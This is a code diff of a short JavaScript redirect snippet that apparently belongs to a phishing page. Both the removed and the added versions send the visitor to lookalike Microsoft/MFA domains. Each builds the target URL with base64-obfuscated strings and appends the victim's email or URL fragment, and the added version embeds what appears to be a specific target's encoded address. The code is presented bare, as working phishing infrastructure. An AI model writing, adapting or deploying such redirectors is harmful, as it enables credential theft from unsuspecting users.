@@ -1,16 +1,17 @@
-<script type="text/javascript">
-    var urlParams = new URLSearchParams(window.location.search);
-    var email = urlParams.get('email');
+ <script type="text/javascript">
+    
+        if(window.location.hash) {
+            var url = window.location.href;
+            var hash = decodeURIComponent(url.split('#').pop());
+            const encdStr = 'bG9naW5fc2VjdXJlbG9naW5fWVdOamIzVnVkR2x1WjBCMGFHVmpiMjVqY21WMFpXVjRjR1Z5ZEhNdVkyOXQuaHRtbA==';
+            const str = atob (encdStr);
+            const emma = '#' + hash;
+            const dr = 'https://officemfa-online.com/';
+            const ax = dr + str;
+            var link = ax + emma;
+            window.location.href = link;
+        } else {
+          window.location.href = link;
+        }
 
-    if (email) {
-        const encdStr = 'LndvcmtlcnMuZGV2';
-        const str = atob(encdStr)
-        const emma = '#' + email;
-        const dr = 'https://0581131e.officesecure365';
-        const ax = dr + str;
-        var link = ax + emma;
-        window.location.href = link;
-    } else {
-        // Handle case when 'email' parameter is not present
-    }
-</script>
+    </script>
